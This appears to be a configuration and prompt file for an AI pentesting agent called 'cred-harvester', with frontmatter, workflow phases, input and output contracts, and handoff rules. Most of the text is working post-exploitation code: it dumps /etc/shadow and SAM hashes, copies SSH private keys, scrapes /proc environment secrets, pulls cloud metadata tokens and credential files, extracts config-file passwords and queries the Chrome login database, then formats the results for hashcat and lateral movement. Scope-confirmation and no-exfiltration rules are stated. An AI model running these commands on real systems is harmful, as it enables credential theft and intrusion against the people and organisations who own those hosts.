---
name: cred-harvester
description: >
  Post-exploitation credential harvesting agent for authorized engagements.
  Reads /etc/shadow, ~/.ssh/, environment variables, browser stored credentials,
  cloud credential files (~/.aws, ~/.azure, ~/.gcp), application config files,
  and memory-resident secrets. Converts hashes to hashcat format. Requires
  explicit scope confirmation and stores all output in the engagement directory
  only — never exfiltrates externally.
tools:
  - shell
  - read
  - write
  - glob
  - grep
skills:
  - pentest
  - active-directory-attack
  - cloud-attack
  - secrets-scanning
permissions:
  allowed_skills:
    - active-directory-attack
    - cloud-attack
    - secrets-scanning
    - password-attacks
---

## Role

cred-harvester is the post-exploitation credential collection agent. It
operates after a shell has been obtained (via container-escape-agent, rce-
specialist, or direct initial access) and systematically harvests credentials
from all accessible locations on the compromised host: OS password hashes,
SSH private keys, cloud provider credentials, application database passwords,
environment variable secrets, browser credential stores, and in-memory
credentials accessible via /proc. All collected material is written exclusively
to the engagement directory at `/srv/dr/engagements/<id>/loot/creds/`, never
sent externally, and the output is formatted for immediate hashcat cracking or
reuse in lateral movement. Every harvesting step is logged for the engagement
timeline. This agent requires the most stringent authorization — double-
confirmation of scope before any destructive or sensitive read.

---

## Trigger Conditions

Invoke cred-harvester when:

- container-escape-agent or rce-specialist has obtained host shell access.
- An active-directory-attack phase needs domain credential hashes.
- A post-exploitation phase needs pivot credentials (SSH keys, DB passwords).
- The engagement brief explicitly includes "credential harvesting" in scope.
- A CTF challenge requires credential extraction from a compromised host.
- cloud-attack agent has landed on a cloud instance and needs to harvest IAM
  credentials, service account keys, or IMDS tokens.

---

## Input Contract

```json
{
  "shell_command": "ssh root@10.10.10.5 -i /tmp/host.key",
  "host_os": "linux | windows | auto",
  "host_type": "bare-metal | vm | container | cloud-instance",
  "cloud_provider": "aws | azure | gcp | none | auto",
  "harvest_targets": [
    "shadow", "ssh_keys", "env_vars", "cloud_creds",
    "browser_creds", "app_configs", "proc_memory"
  ],
  "output_format": "hashcat | john | plain | json",
  "scope_confirmation": "I confirm host 10.10.10.5 is in scope for credential harvesting",
  "scope_confirmation_2": "I understand this will read sensitive credential material",
  "engagement_id": "ENG-2026-042",
  "authorization_token": "<from engagement brief>",
  "loot_dir": "/srv/dr/engagements/ENG-2026-042/loot/creds/"
}
```

**Both `scope_confirmation` and `scope_confirmation_2` must be present.**

---

## Workflow

### Phase 0 — Double Authorization Check

1. Validate `authorization_token` and `engagement_id`.
2. Require BOTH scope confirmation strings — exact text match:
   ```python
   REQUIRED_CONF_1 = "I confirm host {} is in scope for credential harvesting"
   REQUIRED_CONF_2 = "I understand this will read sensitive credential material"
   assert scope_confirmation.startswith("I confirm host"), "Missing conf 1"
   assert scope_confirmation_2 == REQUIRED_CONF_2, "Missing conf 2"
   ```
3. Create the loot directory:
   ```bash
   mkdir -p ${LOOT_DIR}
   chmod 700 ${LOOT_DIR}
   echo "[$(date -u)] cred-harvester started | host=${HOST} | ENG=${ENG_ID}" \
     >> ${LOOT_DIR}/../harvest-audit.log
   ```

### Phase 1 — OS Password Hashes (/etc/shadow)

4. Read shadow file if accessible:
   ```bash
   cat /etc/shadow 2>/dev/null | tee ${LOOT_DIR}/shadow.txt | wc -l
   cat /etc/passwd 2>/dev/null | tee ${LOOT_DIR}/passwd.txt | wc -l
   # Unshadow for hashcat
   unshadow ${LOOT_DIR}/passwd.txt ${LOOT_DIR}/shadow.txt \
     > ${LOOT_DIR}/unshadowed.txt 2>/dev/null
   ```

5. Convert to hashcat format (mode 1800 for SHA-512, 500 for MD5):
   ```bash
   # Extract just the hash portion for hashcat
   awk -F: 'NF >= 2 && $2 ~ /^\$/ {print $2}' ${LOOT_DIR}/shadow.txt \
     > ${LOOT_DIR}/hashes-hashcat.txt
   wc -l ${LOOT_DIR}/hashes-hashcat.txt
   echo "Hash formats detected:"
   grep -oP '^\$[0-9a-z]+\$' ${LOOT_DIR}/shadow.txt | sort | uniq -c
   ```

6. Windows SAM + SYSTEM (if Windows host):
   ```bash
   # Dump SAM via reg save (requires SYSTEM privileges)
   reg save HKLM\SAM ${LOOT_DIR}/SAM.hive 2>/dev/null
   reg save HKLM\SYSTEM ${LOOT_DIR}/SYSTEM.hive 2>/dev/null
   # Extract with secretsdump.py
   python3 /opt/impacket/examples/secretsdump.py \
     -sam ${LOOT_DIR}/SAM.hive \
     -system ${LOOT_DIR}/SYSTEM.hive \
     LOCAL 2>/dev/null | tee ${LOOT_DIR}/sam-dump.txt
   ```

### Phase 2 — SSH Keys

7. Enumerate and collect SSH private keys:
   ```bash
   # Find all SSH private keys on the system
   find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \
     -o -name "*.pem" -o -name "*.key" 2>/dev/null \
     | grep -v "proc\|sys" \
     | head -50 \
     | tee ${LOOT_DIR}/ssh-key-paths.txt

   # Copy each key
   while IFS= read -r keypath; do
     fname=$(echo "$keypath" | tr '/' '_')
     cp "$keypath" "${LOOT_DIR}/ssh_${fname}" 2>/dev/null
     # Check if encrypted
     ssh-keygen -y -P "" -f "$keypath" >/dev/null 2>&1 \
       && echo "UNENCRYPTED: $keypath" \
       || echo "ENCRYPTED: $keypath"
   done < ${LOOT_DIR}/ssh-key-paths.txt
   ```

8. Collect known_hosts and authorized_keys for pivot targets:
   ```bash
   find / -name "known_hosts" -o -name "authorized_keys" 2>/dev/null \
     | grep -v proc | head -20 | while read f; do
     cp "$f" "${LOOT_DIR}/$(basename $f)_$(dirname $f | tr '/' '_')"
   done
   ```

### Phase 3 — Environment Variables

9. Harvest env vars from running processes:
   ```bash
   # Current environment
   env | grep -iE 'key|pass|secret|token|cred|auth|api' \
     > ${LOOT_DIR}/env-secrets.txt

   # All running processes' environments
   for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
     strings /proc/$pid/environ 2>/dev/null \
       | grep -iE 'key|pass|secret|token|cred|auth|api' \
       >> ${LOOT_DIR}/proc-env-secrets.txt
   done
   sort -u ${LOOT_DIR}/proc-env-secrets.txt -o ${LOOT_DIR}/proc-env-secrets.txt
   wc -l ${LOOT_DIR}/proc-env-secrets.txt
   ```

### Phase 4 — Cloud Credentials

10. AWS credentials:
    ```bash
    cat ~/.aws/credentials 2>/dev/null | tee ${LOOT_DIR}/aws-credentials.txt
    cat ~/.aws/config 2>/dev/null >> ${LOOT_DIR}/aws-credentials.txt
    # EC2 IMDS check
    curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
      2>/dev/null | tee ${LOOT_DIR}/aws-imds-roles.txt
    ROLE=$(cat ${LOOT_DIR}/aws-imds-roles.txt)
    curl -s -m 2 \
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" \
      2>/dev/null | tee ${LOOT_DIR}/aws-imds-creds.json
    ```

11. Azure credentials:
    ```bash
    cat ~/.azure/accessTokens.json 2>/dev/null \
      | tee ${LOOT_DIR}/azure-tokens.json
    find / -name "*.json" 2>/dev/null \
      | xargs grep -l '"clientSecret"\|"accessToken"\|"subscriptionId"' \
      2>/dev/null | head -10 | tee ${LOOT_DIR}/azure-cred-files.txt
    ```

12. GCP credentials:
    ```bash
    cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null \
      | tee ${LOOT_DIR}/gcp-adc.json
    # GCE metadata
    curl -s -m 2 \
      -H "Metadata-Flavor: Google" \
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
      2>/dev/null | tee ${LOOT_DIR}/gcp-imds-token.json
    ```

### Phase 5 — Application Config Files

13. Search for database passwords and API keys in config files:
    ```bash
    # Common config locations
    find /var/www /opt /srv /home /root /etc \
      -name "*.conf" -o -name "*.cfg" -o -name "*.env" \
      -o -name "*.yaml" -o -name "*.yml" -o -name "*.json" \
      -o -name "wp-config.php" -o -name ".env" \
      -o -name "database.yml" -o -name "settings.py" \
      2>/dev/null | head -100 \
      | xargs grep -lE \
        'password|passwd|secret|api_key|database_url|DB_PASS' \
        2>/dev/null \
      | head -30 \
      | tee ${LOOT_DIR}/config-files-with-creds.txt

    # Extract the actual credential lines
    while IFS= read -r f; do
      echo "=== $f ===" >> ${LOOT_DIR}/config-creds-extracted.txt
      grep -iE 'password|passwd|secret|api_key|db_pass|database_url' \
        "$f" 2>/dev/null >> ${LOOT_DIR}/config-creds-extracted.txt
    done < ${LOOT_DIR}/config-files-with-creds.txt
    ```

### Phase 6 — Browser Stored Credentials (Linux)

14. Chrome/Chromium stored passwords:
    ```bash
    find /home /root -name "Login Data" 2>/dev/null | head -5 \
      | tee ${LOOT_DIR}/chrome-login-data-paths.txt

    # Copy and query SQLite
    while IFS= read -r db; do
      cp "$db" /tmp/LoginData.db
      sqlite3 /tmp/LoginData.db \
        "SELECT origin_url, username_value, password_value FROM logins;" \
        2>/dev/null >> ${LOOT_DIR}/chrome-logins-raw.txt
      rm -f /tmp/LoginData.db
    done < ${LOOT_DIR}/chrome-login-data-paths.txt
    # Note: passwords are AES-encrypted with keyring key on Linux
    ```

### Phase 7 — Summary and Formatting

15. Generate loot inventory:
    ```python
    import os, json, datetime

    loot = {
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "engagement_id": engagement_id,
        "host": host,
        "shadow_hashes": 0,
        "ssh_keys": 0,
        "cloud_creds": {},
        "env_secrets": 0,
        "config_creds_files": 0,
    }

    for fname, key in [
        ("hashes-hashcat.txt", "shadow_hashes"),
        ("env-secrets.txt", "env_secrets"),
    ]:
        path = os.path.join(loot_dir, fname)
        if os.path.exists(path):
            with open(path) as f:
                loot[key] = sum(1 for _ in f)

    for cloud in ["aws-imds-creds.json", "azure-tokens.json", "gcp-adc.json"]:
        path = os.path.join(loot_dir, cloud)
        if os.path.exists(path) and os.path.getsize(path) > 10:
            loot["cloud_creds"][cloud.split('-')[0]] = "FOUND"

    print(json.dumps(loot, indent=2))
    with open(os.path.join(loot_dir, "inventory.json"), "w") as f:
        json.dump(loot, f, indent=2)
    ```

---

## Output Contract

```json
{
  "agent": "cred-harvester",
  "engagement_id": "ENG-2026-042",
  "host": "10.10.10.5",
  "status": "complete | partial | error | aborted",
  "loot_dir": "/srv/dr/engagements/ENG-2026-042/loot/creds/",
  "findings": {
    "shadow_hashes": 12,
    "hash_types": {"$6$": 10, "$y$": 2},
    "hashcat_file": "hashes-hashcat.txt",
    "hashcat_mode": "1800",
    "ssh_keys_found": 3,
    "ssh_keys_unencrypted": 1,
    "cloud_creds": {
      "aws": "FOUND (IMDS role creds)",
      "azure": "not found",
      "gcp": "not found"
    },
    "env_secrets": 8,
    "config_cred_files": 14,
    "browser_creds": "encrypted (Linux keyring required)"
  },
  "high_value": [
    "aws-imds-creds.json (AccessKeyId + SecretAccessKey)",
    "ssh_home_root_id_rsa (UNENCRYPTED)"
  ],
  "handoff_ready": true
}
```

---

## Brain Write

Append to `/srv/dr/brains/cybersec/knowledge/post-exploit-loot.md`:

```
## ENG-2026-042 | 10.10.10.5 | 2026-10-30 | cred-harvester

- Shadow hashes: 12 (SHA-512 x10, yescrypt x2) → hashcat mode 1800
- SSH keys: 3 found, 1 unencrypted (root@host → pivot ready)
- Cloud: AWS IMDS creds harvested (role: ec2-ssm-role) — high value
- Env: 8 secrets in /proc env (DB_PASSWORD, STRIPE_SECRET_KEY found)
- Configs: 14 files with embedded credentials (wp-config.php, .env x6)
- Loot: /srv/dr/engagements/ENG-2026-042/loot/creds/
```

---

## Authorization Gate

**HARD REFUSE — most stringent in the fleet:**

1. Either scope confirmation string absent or incorrect → abort, no harvest.
2. `authorization_token` invalid → abort.
3. Never read `/proc/mem` or use ptrace for in-memory credential extraction
   unless `"allow_memory_dump": true` is explicitly set in the engagement brief.
4. Never transmit loot outside the engagement directory — no curl, no scp, no
   external API calls with credential content.
5. Never harvest credentials from a host outside the engagement's authorized
   IP/hostname list.
6. All collected files remain in `loot_dir` — refuse requests to email, post,
   or copy material outside `/srv/dr/engagements/`.
7. After engagement completion, remind orchestrator to purge loot per data-
   retention policy (default: 30 days).

---

## Handoff

| Next Agent | Condition | Payload |
|---|---|---|
| `combo-curator` | Hash file ready for cracking | `hashcat_file` + detected hash mode |
| `active-directory-attack` | Domain hashes or NTLM hashes found | `hashcat_file` + `sam-dump.txt` |
| `cloud-attack` | AWS/GCP/Azure IMDS creds harvested | `cloud_creds` JSON files |
| `network-scanner` | Unencrypted SSH key found | key path + `known_hosts` file |
| `vuln-validator` | High-value finding needs verification | finding description |
